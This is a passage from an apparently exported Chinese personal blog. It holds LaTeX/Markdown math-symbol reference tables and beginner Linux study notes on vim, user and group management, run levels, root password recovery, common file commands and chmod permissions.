<td>$\sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$T$</td>
<td>T</td>
<td>$\tau$</td>
<td>\tau</td>
</tr>
<tr>
<td>$\Upsilon$</td>
<td>\Upsilon</td>
<td>$\upsilon$</td>
<td>\upsilon</td>
</tr>
<tr>
<td>$\Phi$</td>
<td>\Phi</td>
<td>$\phi$</td>
<td>\phi</td>
</tr>
<tr>
<td></td>
<td></td>
<td>$\varphi$</td>
<td>\varphi</td>
</tr>
<tr>
<td>$X$</td>
<td>X</td>
<td>$\chi$</td>
<td>\chi</td>
</tr>
<tr>
<td>$\Psi$</td>
<td>\Psi</td>
<td>$\psi$</td>
<td>\psi</td>
</tr>
<tr>
<td>$\Omega$</td>
<td>\Omega</td>
<td>$\omega$</td>
<td>\omega</td>
</tr>
</tbody></table>
<h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><table>
<thead>
<tr>
<th>三角函数</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sin$</td>
<td>\sin</td>
</tr>
</tbody></table>
<h2 id="对数函数"><a href="#对数函数" class="headerlink" title="对数函数"></a><strong>对数函数</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\ln2$</td>
<td>\ln2</td>
</tr>
<tr>
<td>$\log_28$</td>
<td>\log_28</td>
</tr>
<tr>
<td>$\lg10$</td>
<td>\lg10</td>
</tr>
</tbody></table>
<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a><strong>关系运算符</strong></h2><table>
<thead>
<tr>
<th>运算符</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\pm$</td>
<td>\pm</td>
</tr>
<tr>
<td>$\times$</td>
<td>\times</td>
</tr>
<tr>
<td>$\cdot$</td>
<td>\cdot</td>
</tr>
<tr>
<td>$\div$</td>
<td>\div</td>
</tr>
<tr>
<td>$\neq$</td>
<td>\neq</td>
</tr>
<tr>
<td>$\equiv$</td>
<td>\equiv</td>
</tr>
<tr>
<td>$\leq$</td>
<td>\leq</td>
</tr>
<tr>
<td>$\geq$</td>
<td>\geq</td>
</tr>
<tr>
<td>$\approx$</td>
<td>\approx</td>
</tr>
</tbody></table>
<h2 id="其它特殊字符"><a href="#其它特殊字符" class="headerlink" title="其它特殊字符"></a><strong>其它特殊字符</strong></h2><table>
<thead>
<tr>
<th>符号</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\forall$</td>
<td>\forall</td>
</tr>
<tr>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>$\emptyset$</td>
<td>\emptyset</td>
</tr>
<tr>
<td>$\exists$</td>
<td>\exists</td>
</tr>
<tr>
<td>$\nabla$</td>
<td>\nabla</td>
</tr>
<tr>
<td>$\bot$</td>
<td>\bot</td>
</tr>
<tr>
<td>$\angle$</td>
<td>\angle</td>
</tr>
<tr>
<td>$\because$</td>
<td>\because</td>
</tr>
<tr>
<td>$\therefore$</td>
<td>\therefore</td>
</tr>
<tr>
<td>$\lceil$</td>
<td>\lceil</td>
</tr>
<tr>
<td>$\rceil$</td>
<td>\rceil</td>
</tr>
<tr>
<td>$\lfloor$</td>
<td>\lfloor</td>
</tr>
<tr>
<td>$\rfloor$</td>
<td>\rfloor</td>
</tr>
</tbody></table>
<h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">a = \left[</span><br><span class="line">\matrix&#123;</span><br><span class="line">  \alpha_1 &amp; test1\\</span><br><span class="line">  \alpha_2 &amp; test2\\</span><br><span class="line">  \alpha_3 &amp; test3 </span><br><span class="line">&#125;</span><br><span class="line">\right]</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>

<p>$$<br>a &#x3D; \left(<br>\matrix{<br>  \alpha_1 &amp; test1\<br>  \alpha_2 &amp; test2\<br>  \alpha_3 &amp; test3<br>}<br>\right)<br>$$</p>
<h2 id="离散数学"><a href="#离散数学" class="headerlink" title="离散数学"></a>离散数学</h2><table>
<thead>
<tr>
<th>符号</th>
<th>markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\leftrightarrow$</td>
<td>\leftrightarrow</td>
</tr>
<tr>
<td>$\leftarrow$</td>
<td>\leftarrow</td>
</tr>
<tr>
<td>$\rightarrow$</td>
<td>\rightarrow</td>
</tr>
<tr>
<td>$\Leftrightarrow$</td>
<td>\Leftrightarrow</td>
</tr>
<tr>
<td>$\Rightarrow$</td>
<td>\Rightarrow</td>
</tr>
<tr>
<td>$\Leftarrow$</td>
<td>\Leftarrow</td>
</tr>
<tr>
<td>$\neg$</td>
<td>\neg</td>
</tr>
<tr>
<td>$\cup$</td>
<td>\cup</td>
</tr>
<tr>
<td>$\cap$</td>
<td>\cap</td>
</tr>
<tr>
<td>$\and$</td>
<td>\and</td>
</tr>
<tr>
<td>$\or$</td>
<td>\or</td>
</tr>
<tr>
<td>$\subset$</td>
<td>\subset</td>
</tr>
<tr>
<td>$\supset$</td>
<td>\supset</td>
</tr>
<tr>
<td>$\subseteq$</td>
<td>\subseteq</td>
</tr>
<tr>
<td>$\supseteq$</td>
<td>\supseteq</td>
</tr>
<tr>
<td>$\in$</td>
<td>\in</td>
</tr>
<tr>
<td>$\notin$</td>
<td>\notin</td>
</tr>
<tr>
<td>$\ni$</td>
<td>\ni</td>
</tr>
<tr>
<td>$\oplus$</td>
<td>\oplus</td>
</tr>
<tr>
<td>$\Pi$</td>
<td>\Pi</td>
</tr>
<tr>
<td>$\Sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$\ge$</td>
<td>\ge</td>
</tr>
<tr>
<td>$\le$</td>
<td>\le</td>
</tr>
<tr>
<td>$\forall$</td>
<td>\forall</td>
</tr>
<tr>
<td>$\exist$</td>
<td>\exist</td>
</tr>
<tr>
<td>$\sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$\neq$</td>
<td>\neq</td>
</tr>
<tr>
<td>$\emptyset$</td>
<td>\emptyset</td>
</tr>
<tr>
<td>$\bar{A}$</td>
<td>\bar{A}</td>
</tr>
<tr>
<td>$\odot$</td>
<td>\odot</td>
</tr>
<tr>
<td>$\circ$</td>
<td>\circ</td>
</tr>
<tr>
<td>$\cong$</td>
<td>\cong</td>
</tr>
<tr>
<td>$\Omega$</td>
<td>\Omega</td>
</tr>
<tr>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>$\overline{x+y}$</td>
<td>\overline</td>
</tr>
<tr>
<td>$\underline{x+y}$</td>
<td>\underline</td>
</tr>
<tr>
<td>$\cdots$</td>
<td>\cdots</td>
</tr>
<tr>
<td>$a\qquad b$</td>
<td>\qquad</td>
</tr>
<tr>
<td>$\ast$</td>
<td>\ast</td>
</tr>
<tr>
<td>$\cdot$</td>
<td>\cdot</td>
</tr>
<tr>
<td>$\bullet$</td>
<td>\bullet</td>
</tr>
<tr>
<td>$\lhd$</td>
<td>\lhd</td>
</tr>
<tr>
<td>$\unlhd$</td>
<td>\unlhd</td>
</tr>
<tr>
<td>$\rhd$</td>
<td>\rhd</td>
</tr>
<tr>
<td>$\unrhd$</td>
<td>\unrhd</td>
</tr>
</tbody></table>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234015.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>chaos</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2021/12/21/Chaos/Linux/</url>
    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>一切皆文件</p>
<p>在许多类 <a href="https://zh.wikipedia.org/wiki/Unix">Unix</a> 计算机系统中， <strong>procfs</strong> 是 <a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B">进程</a> <a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a> (file system) 的缩写，包含一个伪文件系统（启动时动态生成的文件系统），用于通过<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>访问进程信息。这个文件系统通常被挂载到 <code>/proc</code> <a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E5%BD%95_(%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F)">目录</a>。由于 <code>/proc</code> 不是一个真正的文件系统，它也就不占用存储空间，只是占用有限的内存。</p>
<p>挂载？</p>
<p><strong>挂载</strong>（mounting）是指由<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>使一个<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E6%95%B8%E6%93%9A%E5%AD%98%E8%B2%AF%E5%99%A8">存储设备</a>（诸如<a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E7%9B%98">硬盘</a>、<a href="https://zh.wikipedia.org/wiki/CD-ROM">CD-ROM</a>或<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90">共享资源</a>）上的<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E6%AA%94%E6%A1%88">电脑文件</a>和<a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E5%BD%95_(%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F)">目录</a>可供用户通过计算机的<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>访问的一个过程。[<a href="https://zh.wikipedia.org/wiki/%E6%8C%82%E8%BD%BD#cite_note-1">1]</a></p>
<p>一般来说，当计算机<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E6%9C%BA">关机</a>时，每个已挂载存储都将经历一次卸载，以确保所有排队的数据被写入，并保证介质上文件系统结构的完整性。</p>
<p>所有linux系统都会内建vi文本编辑器，vim是vi的增强版本</p>
<p>vim ：</p>
<ul>
<li>拷贝当前行 yy , 拷贝当前行向下的 5 行 5yy，并粘贴 p。【快捷键在正常模式下使用】 </li>
<li>删除当前行 dd , 删除当前行向下的 5 行 5dd</li>
<li>在文件中查找某个单词 [命令模式下 &#x2F;关键字 ， 回车 查找 , 输入 n 就是查找下一个 ]</li>
<li>设置文件的行号，取消文件的行号.[命令行下 : set nu 和 :set nonu]</li>
<li>编辑 &#x2F;etc&#x2F;profile 文件，使用快捷键到底文档的最末行[G]和最首行[gg] 【正常模式下】</li>
<li>在一个文件中输入 “hello” ,然后又撤销这个动作 u 【正常模式下】</li>
<li>编辑 &#x2F;etc&#x2F;profile 文件，并将光标移动到 20 行 shift+g<ul>
<li>Set nu</li>
<li>:20</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">立刻关机</span></span><br><span class="line">shutdown -h now</span><br><span class="line"><span class="meta">#</span><span class="language-bash">1分钟后关机</span></span><br><span class="line">shutdown -h 1</span><br><span class="line">shutdown -r now</span><br><span class="line">shutdown -r 1</span><br><span class="line"><span class="meta">#</span><span class="language-bash">立刻关机</span></span><br><span class="line">halt </span><br><span class="line"><span class="meta">#</span><span class="language-bash">立刻重启</span></span><br><span class="line">reboot 【立刻重启】 </span><br><span class="line"><span class="meta">#</span><span class="language-bash">在重启和关机前，通常需要先执行，把内存的数据，写入磁盘</span></span><br><span class="line">sync </span><br></pre></td></tr></table></figure>

<ol>
<li><p>登录时尽量少用 <strong>root</strong> 帐号登录，因为它是系统管理员，最大的权限，避免操作失误。可以利用 普通用户登录，登录后再用”su - 用户名’命令来切换成系统管理员身份.</p>
</li>
<li><p>在提示符下输入 logout 即可注销用户【不同的 shell 可能不同(logout exit)】</p>
</li>
<li><p>logout 注销指令在图形运行级别(简单提一下:<strong>0-6</strong> 个级别)无效，在 运行级别 3 下有效.</p>
</li>
<li><p>运行级别这个概念，后面给大家介绍</p>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">会自动创建用户组</span></span><br><span class="line">useradd xiaoming</span><br><span class="line">passwd xiaoming</span><br><span class="line"><span class="meta"># </span><span class="language-bash">目录保留</span></span><br><span class="line">userdel xiaoming</span><br><span class="line"><span class="meta"># </span><span class="language-bash">删除目录</span></span><br><span class="line">userdel -r xiaoming</span><br><span class="line"><span class="meta"># </span><span class="language-bash">查询用户信息</span></span><br><span class="line">id mingwhuang</span><br><span class="line"><span class="meta"># </span><span class="language-bash">切换用户</span></span><br><span class="line">su</span><br><span class="line"><span class="meta"># </span><span class="language-bash">返回原来的用户</span></span><br><span class="line">exit</span><br><span class="line"><span class="meta"># </span><span class="language-bash">新增组</span></span><br><span class="line">groupadd 组名</span><br><span class="line"><span class="meta"># </span><span class="language-bash">增加用户是直接加上组</span></span><br><span class="line">useradd -g 用户组 用户名</span><br><span class="line"><span class="meta">#</span><span class="language-bash">删除组，组内不能有用户</span></span><br><span class="line">groupdel 组名</span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改用户组</span></span><br><span class="line">usermod -g 新的组名 用户名</span><br></pre></td></tr></table></figure>

<p>当创建用户成功后，会自动的创建和用户同名的家目录 【&#x2F;home&#x2F;xiaoming】<br>也可以通过 useradd -d 指定目录 新的用户名 jack，给新创建的用户指定家目录</p>
<h2 id="实用指令"><a href="#实用指令" class="headerlink" title="实用指令"></a>实用指令</h2><p>运行级别说明:</p>
<ul>
<li><p>0 :关机</p>
</li>
<li><p>1 :单用户 [类似安全模式， 这个模式可以帮助找回 root 密码] 3) </p>
</li>
<li><p>2:多用户状态没有网络服务</p>
</li>
<li><p>3:多用户状态有网络服务 [使用最多]</p>
</li>
<li><p>4:系统未使用保留给用户</p>
</li>
<li><p>5:图形界面 【】</p>
</li>
<li><p>6:系统重启</p>
</li>
</ul>
<p>常用运行级别是 <strong>3</strong> 和 <strong>5</strong> ，要修改默认的运行级别可改文件</p>
<p>init 【0-6】</p>
<h3 id="找回密码"><a href="#找回密码" class="headerlink" title="找回密码"></a>找回密码</h3><p>centos6</p>
<p>启动时-&gt;快速输入 enter-&gt;输入 e-&gt; 进入到编辑界面-&gt; 选择中间有 kernel 项-&gt; 输入 e(edit)-&gt; 在该行的最后写入 1 [表示修改内核，临时生效]-&gt; 输入 enter-&gt; 输入 b [boot]-&gt; 进入到单用模式 【这里就可以做补救工作】</p>
<p>修改密码不能通过ssh来修改，必须要在服务器操作</p>
<p>centos7</p>
<ol>
<li><p>启动系统，并在GRUB2启动屏显时，按下e键进入编辑模式。</p>
</li>
<li><p>在linux16&#x2F;linux&#x2F;linuxefi所在参数行尾添加以下内容：init&#x3D;&#x2F;bin&#x2F;sh</p>
</li>
<li><p>按Ctrl+x启动到shell(mac是Command+x)。</p>
</li>
<li><p>挂载文件系统为可写模式：mount –o remount, rw &#x2F;</p>
</li>
<li><p>运行passwd,并按提示修改root密码。</p>
</li>
<li><p>如何之前系统启用了selinux，必须运行以下命令，否则将无法正常启动系统：touch &#x2F;.autorelabel</p>
</li>
<li><p>运行命令exec &#x2F;sbin&#x2F;init来正常启动，或者用命令exec &#x2F;sbin&#x2F;reboot重启</p>
</li>
</ol>
<p>Centos7可以自己设置用户密码规则</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pwd</span><br><span class="line">man ls</span><br><span class="line">help ls</span><br><span class="line"><span class="meta">#</span><span class="language-bash">显示隐藏文件</span></span><br><span class="line">ls -la</span><br><span class="line">ll</span><br><span class="line"><span class="meta">#</span><span class="language-bash">创建多级目录用-p参数</span></span><br><span class="line">mkdir -p /home/test</span><br><span class="line">rmdir</span><br><span class="line"><span class="meta"># </span><span class="language-bash">递归删除，强制删除</span></span><br><span class="line">rm -rf</span><br><span class="line"><span class="meta"># </span><span class="language-bash">创建空文件</span></span><br><span class="line">touch</span><br><span class="line">cp [选项] source【源】 dest【目的文件】 </span><br><span class="line"><span class="meta">#</span><span class="language-bash">回到家目录</span></span><br><span class="line">cd </span><br><span class="line">cd ~</span><br><span class="line"><span class="meta">#</span><span class="language-bash">回到根</span></span><br><span class="line">cd /</span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">cat</span> 只能浏览文件，而不能修改文件，为了浏览方便，一般会带上 管道命令 | more</span></span><br><span class="line">cat test.txt | more #(把 cat xxx.txt 输出结果交给 more 处理)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">more 指令是一个基于 VI 编辑器的文本过滤器，它以全屏幕的方式按页显示文本文件的内容。more指令中内置了若干快捷键</span></span><br><span class="line">more text.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">less 指令用来分屏查看文件内容，它的功能与 more 指令类似，但是比 more 指令更加强大，支持各 种显示终端。less 指令在显示文件内容时，并不是一次将整个文件加载之后才显示，而是根据显示需要加载内容，对于显示大型文件具有较高的效率。</span></span><br><span class="line">less text.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出内容到控制台</span></span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">head -n 5 text.txt</span><br><span class="line"></span><br><span class="line">tail -n 5 text.txt</span><br><span class="line"><span class="meta"># </span><span class="language-bash">实时追踪该文档的所有更新</span></span><br><span class="line">tail -f </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">&gt;输出重定向 会覆盖  &gt;&gt; 不会覆盖 追加</span></span><br><span class="line">ls –l /home/ &gt; /home/info.txt #[如果文件不存在，则会自动创建]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">ln</span>类似于windows里的快捷方式，主要存放了链接其他文件的路径</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">在/home 目录下创建一个软连接 linkToRoot，连接到 /root 目录</span></span><br><span class="line">ln -s /root/ linkToRoot</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">删除软连接 linkToRoot</span></span><br><span class="line">rm -rf linkToRoot</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">当我们使用 <span class="built_in">pwd</span> 指令查看目录时，仍然看到的是软链接所在目录。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">history</span> 查看已经执行过历史命令,也可以执行历史指令</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看最近10条</span></span><br><span class="line">history 10</span><br><span class="line"><span class="meta">#</span><span class="language-bash">执行编号为5的指令</span></span><br><span class="line">!5</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">date</span></span></span><br><span class="line">date</span><br><span class="line">date +%Y</span><br><span class="line">date +%m</span><br><span class="line">date +%d</span><br><span class="line">date &quot;+%Y-%m-%d %H:%M:%S&quot; #(功能描述:显示年月日时分秒)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置时间</span></span><br><span class="line">date -s &quot;2020-11-11 11:22:22&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">恢复时间</span></span><br><span class="line">yum -y install ntp ntpdate</span><br><span class="line">service ntp stop</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">日历</span></span><br><span class="line">cal</span><br><span class="line">cal 2020</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">find [搜索范围] [选项]</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">按文件名:根据名称查找/home 目录下的 hello.txt 文件</span></span><br><span class="line">find /home -name hello.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">按拥有者:查找/opt 目录下，用户名称为 nobody 的文件</span></span><br><span class="line">find /opt -user nobody</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查找整个 linux 系统下大于 10M 的文件(+n 大于 -n 小于 n 等于)</span></span><br><span class="line">find / -size +10M</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">locate指令可以快速定位文件路径。locate指令利用事先建立的系统中所有文件名称及路径的locate数据库实现快速定位给定的文件。Locate 指令无需遍历整个文件系统，查询速度较快。为了保证查询结 果的准确度，管理员必须定期更新 locate 时刻。</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">由于 locate 指令基于数据库进行查询，所以第一次运行前，必须使用 updatedb 指令创建 locate 数据库。</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">locate 与 find 不同: find 是去硬盘找，locate 只在 /var/lib/slocate 资料库中找。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">locate 的速度比 find 快，它并不是真的查找，而是查数据库，一般文件数据库在 /var/lib/slocate/slocate.db 中，所以 locate 的查找并不是实时的，而是以数据库的更新为准，一般是系统自己维护，也可以手工升级数据库</span></span><br><span class="line">yum -y install mlocate</span><br><span class="line">updatedb</span><br><span class="line">locate text.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep 过滤查找 ， 管道符，“|”，表示将前一个命令的处理结果输出传递给后面的命令处理。</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">在 /etc/profile 文件中，查找 <span class="string">&quot;if&quot;</span> 所在行，并且显示行号</span></span><br><span class="line">grep –n if /etc/profile # [在/etc/profile 中查找 if ,并显示行，区别大小写]</span><br><span class="line">grep –ni if /etc/profile # [在/etc/profile 中查找 if ,并显示行，不区别大小写]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">gzip/gunzip 指令,压缩了之后原来的文件不在了</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">zip/unzip 指令</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 /home 下的 所有文件进行压缩成 mypackage.zip [退出 home]</span> </span><br><span class="line">zip -r mypackage.zip /home/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 mypackge.zip 解压到 /opt/tmp 目录下</span></span><br><span class="line">unzip –d /opt/tmp mypackage.zip #[如果/opt/tmp 不存在，会自动创建]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">tar指令 -c 产生.tar打包文件 -v 显示详细信息 -f 指定压缩后的文件名 -z 打包同时压缩 -x 解包.tar文件</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">压缩多个文件，将 /home/a1.txt 和 /home/a2.txt 压缩成 a.tar.gz</span></span><br><span class="line">tar -zcvf a.tar.gz a1.txt a2.txt #[注意，路径要写清楚]</span><br><span class="line"><span class="meta"># </span><span class="language-bash">将/home 的文件夹 压缩成 myhome.tar.gz</span></span><br><span class="line">tar -zcvf myhome.tar.gz /home/</span><br><span class="line">tar -zxvf a.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 myhome.tar.gz 解压到 /opt/tmp2 目录下 【-C】</span></span><br><span class="line">tar -zxvf myhome.tar.gz -C /opt/tmp2 #[注意; /opt/tmp2 事先需要创建好]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>more</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>空白键  (space)</td>
<td>代表向下翻一页；</td>
</tr>
<tr>
<td>Enter</td>
<td>代表向下翻『一行』；</td>
</tr>
<tr>
<td>q</td>
<td>代表立刻离开 more ，不再显示该文件内容。</td>
</tr>
<tr>
<td>Ctrl+F</td>
<td>向下滚动一屏</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>返回上一屏</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>输出当前行的行号</td>
</tr>
<tr>
<td>:f</td>
<td>输出文件名和当前行的行号</td>
</tr>
</tbody></table>
<p>Less</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>空白键  (space)</td>
<td>代表向下翻一页；</td>
</tr>
<tr>
<td>Enter</td>
<td>代表向下翻『一行』；</td>
</tr>
<tr>
<td>q</td>
<td>代表立刻离开 more ，不再显示该文件内容。</td>
</tr>
<tr>
<td>Ctrl+F</td>
<td>向下滚动一屏</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>返回上一屏</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>输出当前行的行号</td>
</tr>
<tr>
<td>:f</td>
<td>输出文件名和当前行的行号</td>
</tr>
</tbody></table>
<h2 id="组管理和权限管理"><a href="#组管理和权限管理" class="headerlink" title="组管理和权限管理"></a>组管理和权限管理</h2><p>在 linux 中的每个用户必须属于一个组，不能独立于组外。在 linux 中每个文件 有所有者、所在组、其它组的概念。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改文件所有者</span></span><br><span class="line">chown mingwhuang text.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改组</span></span><br><span class="line">chgrp mingwhuang text.txt</span><br></pre></td></tr></table></figure>



<p><strong>ls -l</strong> <strong>中显示的内容如下</strong>：</p>
<p>-rwxrw-r– 1 root police 1213 Feb 2 09:39 abc.txt</p>
<p>[root@bobohost a]# ls -la</p>
<p>总用量 0</p>
<p>drwxr-xr-x. 2 root root 6 10月 19 16:29 .</p>
<p>dr-xr-x—. 5 root root 91 10月 19 16:41 ..</p>
<p>0-9位说明</p>
<p>1)第0位确定文件类型(说明: -:普通文件, <strong>d</strong>:目录，l : 连接文件, c: 字符设备文件[键盘,鼠标] <strong>b</strong>: 块设备文件[硬盘] )</p>
<p>2)第1-3位确定所有者（该文件的所有者）拥有该文件的权限。<br> R: 读 ， w : 写权限 x: 执行权限 </p>
<p>3)第4-6位确定所属组（同用户组的）拥有该文件的权限</p>
<p>4)第7-9位确定其他用户拥有该文件的权限</p>
<p>5)1: 如果是文件，表示硬链接的数目， 如果是目录，则表示有多少个子目录</p>
<p>6)1213： 表示文件大小，如果是目录，则统一为 4096</p>
<h3 id="rwx权限详解"><a href="#rwx权限详解" class="headerlink" title="rwx权限详解"></a>rwx权限详解</h3><p>​    rwx作用到文件(重要)</p>
<ol>
<li><p>[ r ]代表可读(read): 可以读取,查看</p>
</li>
<li><p>[ w ]代表可写(write): 可以修改,但是不代表可以删除该文件,删除一个文件的前提条件是对该文件所在的目录有写权限，才能删除该文件.</p>
</li>
<li><p>[ x ]代表可执行(execute):可以被执行</p>
</li>
</ol>
<p>​    rwx作用到目录(重要)</p>
<ol>
<li><p>[ r ]代表可读(read): 可以读取，ls查看目录内容</p>
</li>
<li><p>[ w ]代表可写(write): 可以修改,目录内创建+删除+重命名目录</p>
</li>
<li><p>[ x ]代表可执行(execute):可以进入该目录</p>
</li>
</ol>
<h3 id="修改权限-chmod"><a href="#修改权限-chmod" class="headerlink" title="修改权限 chmod"></a>修改权限 chmod</h3><p>基本说明：</p>
<p>通过chmod指令，可以修改文件或者目录的权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">第一种方式：+ 、-、= 变更权限</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">u:所有者 g:所有组 o:其他人 a:所有人(u、g、o的总和)</span></span><br><span class="line"></span><br><span class="line">chmod  u=rwx,g=rx,o=x  文件、目录 【表示：给所有者rwx, 给所在组的用户 rx, 给其他人 x】</span><br><span class="line">chmod  o+w  文件、目录 【表示：给其它用户增加w 的权限】</span><br><span class="line">chmod  a-x  文件、目录 【表示：给所有用户 去掉 x权限】</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">给abc文件 的所有者读写执行的权限，给所在组读执行权限，给其它组读执行权限。</span></span><br><span class="line">chmod u=rwx, g=rx ,o=rx  abc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">给abc文件的所有者除去执行的权限，增加组写的权限</span></span><br><span class="line">chmod u-x, g+w abc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">给abc文件的所有用户添加读的权限</span></span><br><span class="line">chmod a+r abc </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">第二种方式：通过数字变更权限</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">r=4 w=2 x=1        rwx=4+2+1=7</span></span><br><span class="line">chmod u=rwx,g=rx,o=x   文件、目录 </span><br><span class="line"><span class="meta">#</span><span class="language-bash">相当于 <span class="built_in">chmod</span>   751  文件、目录</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 /home/abc.txt 文件的权限修改成  rwxr-xr-x, 使用给数字的方式实现：</span></span><br><span class="line">chmod  u=rwx, g=xr, o=x /home/abc.txt</span><br><span class="line">chmod 751 /home/abc.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

